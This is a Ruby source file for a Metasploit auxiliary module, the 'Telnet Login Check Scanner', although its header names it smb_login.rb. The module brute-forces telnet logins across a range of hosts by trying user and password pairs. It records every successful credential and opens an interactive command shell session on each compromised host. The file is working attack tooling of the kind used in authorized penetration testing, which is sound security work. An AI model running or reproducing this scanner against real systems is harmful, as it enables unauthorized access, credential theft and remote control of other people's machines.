
##
# $Id: smb_login.rb 8121 2010-01-14 18:51:04Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


# 
# Ghetto
#
module CRLFLineEndings
	def put(str)
		return super if not str
		super(str.strip + "\r\n")
	end
end

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Telnet
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute

	include Msf::Auxiliary::Scanner
	def initialize
		super(
			'Name'        => 'Telnet Login Check Scanner',
			#'Version'     => '$Revision: 8121 $',
			'Description' => %q{
				This module will test a telnet login on a range of machines and
				report successful logins.  If you have loaded a database plugin
				and connected to a database this module will record successful
				logins and hosts so you can track your access.
			},
			'Author'      => 'egypt',
			'License'     => MSF_LICENSE
		)
		deregister_options('RHOST')
		register_options(
			[
				OptInt.new('ATTEMPTS', [ false, 'Number of login attempts before reconnecting', 3 ])
			], Msf::Exploit::Remote::Telnet)

		@attempts = 0
		@got_shell = false
	end

	def run_host(ip)
		print_status("Starting host #{ip}")
		begin
			each_user_pass { |user, pass|
				try_user_pass(user, pass)
			}
		rescue ::Rex::ConnectionError
			return
		end
		disconnect if not @got_shell
	end

	def try_user_pass(user, pass)
		if @got_shell
			@got_shell = false
			@attempts = 0
			connect
		elsif (@attempts % datastore["ATTEMPTS"] == 0)
			disconnect
			connect
		end

		if password_prompt?
			send_pass(pass)
		elsif login_prompt?
			send_user(user)
			# Ubuntu's telnetd gives a failure right away when trying to login
			# as root. Skipping this user in that instance saves a lot of time
			# but might unnecessarily skip users, especially on high-latency
			# networks.
			#return :next_user if not password_prompt?
			send_pass(pass)
		end

		# if we don't have a pass or a login prompt, maybe it's just an
		# unauthenticated shell, so check for success anyway.

		if (login_succeeded?)
			print_good("#{rhost} - SUCCESSFUL LOGIN #{user} : #{pass}")
			report_auth_info(
				:host	=> rhost,
				:proto	=> 'telnet',
				:user	=> user,
				:pass	=> pass,
				:targ_host	=> rhost,
				:targ_port	=> datastore['RPORT']
			)
			@got_shell = true
			# Windows telnet server requires \r\n line endings and it doesn't
			# seem to affect anything else.
			sock.extend(CRLFLineEndings)
			sess = Msf::Sessions::CommandShell.new(sock)
			framework.sessions.register(sess)
			ret = :next_user
		else
			ret = nil
		end

		@attempts += 1
		return ret
	end

end

